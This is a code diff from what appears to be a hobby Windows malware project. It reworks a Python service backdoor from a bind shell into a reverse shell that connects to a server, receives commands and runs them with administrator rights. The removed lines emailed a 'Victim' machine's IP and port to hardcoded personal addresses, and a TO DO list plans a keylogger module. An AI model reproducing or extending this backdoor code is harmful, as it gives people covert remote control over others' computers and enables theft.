@@ -6,7 +6,6 @@ import sys
 
 import os
 import socket
-import requests
 import subprocess
 import win32comext.shell.shell as shell
 
@@ -30,12 +29,12 @@ class Main(service.WinService):
         self.service_log_filepath = r"C:\Users\User\Desktop\service_log.txt"
         self.config_filepath = r"D:\PROJECTS\PycharmProjects\Python Malware\config.json"
 
-        # self.public_ip = requests.get("https://api.ipify.org").content.decode("utf-8")
-        self.ip = socket.gethostbyname(socket.gethostname())
-        self.port = 8888
+        self.s = None
+        self.server_ip = "127.0.0.1"
+        self.server_port = 8080
 
         self.config = Config.initialize(self.config_filepath)
-        self.email = Email(self.config.smtp.server, self.config.smtp.credentials)
+        # self.email = Email(self.config.smtp.server, self.config.smtp.credentials)
 
     def log(self, log_message):
         with open(self.service_log_filepath, "a") as f:
@@ -44,34 +43,34 @@ class Main(service.WinService):
     def start(self):
         self.is_running = True
         self.log("Service started")
-        self.email.send("dobrioglo0709@outlook.com", "dobrioglo07092006@gmail.com", "Victim",
-                        f"IP: {self.ip}\nPORT: {self.port}")
+        # self.email.send("dobrioglo0709@outlook.com", "dobrioglo07092006@gmail.com", "Victim",
+        #                 f"IP: {self.ip}\nPORT: {self.port}")
 
     def run_backdoor(self):
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.bind((self.ip, self.port))
-        s.listen(1)
-        server, addr = s.accept()
-
-        greetings = f"Hello from {self.ip}\n" \
-                    f"Your cwd is {os.getcwd()}\n" \
-                    f"{os.getcwd()} >> "
-        server.send(greetings.encode())
+        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.s.connect((self.server_ip, self.server_port))
 
         while True:
-            command = server.recv(1024 * 4).decode()
-            self.log("Executing command: " + command)
-            if command == "exit":
-                server.send(f"Backdoor was closed".encode())
-                s.close()
+            received_command = self.s.recv(1024 * 4).decode()
+            self.handle_command(received_command)
+            # try:
+            #     self.execute_admin_cmd(received_command)
+            #     s.send("Successfully executed".encode())
+            # except:
+            #     s.send("An error has occurred".encode())
+
+    def handle_command(self, command):
+        if command == "start shell":
+            self.s.send(f"{os.getcwd()} >> ".encode())
+        elif command[:2] == "cd":
+            os.chdir(command[3:])
+            self.s.send(f"{os.getcwd()} >> ".encode())
+        else:
             try:
-                # if command.find("!user") != -1:
-                #     self.execute_user_cmd(command)
-                # else:
                 self.execute_admin_cmd(command)
-                server.send(f"Successfully executed\n{os.getcwd()} >> ".encode())
-            except:
-                server.send(f"An error has occurred\n{os.getcwd()} >> ".encode())
+                self.s.send(f"Successfully executed\n{os.getcwd()} >> ".encode())
+            except Exception as error:
+                self.s.send(f"Error: {error}\n{os.getcwd()} >> ".encode())
 
     def execute_user_cmd(self, command):
         console_session_id = win32ts.WTSGetActiveConsoleSessionId()
@@ -116,10 +115,9 @@ if __name__ == '__main__':
 
 """
 TO DO:
-reverse shell
-commands executing
+backdoor interface
 module loading
-cli
+user-friendly cli
 
 keylogger (as module)
 """
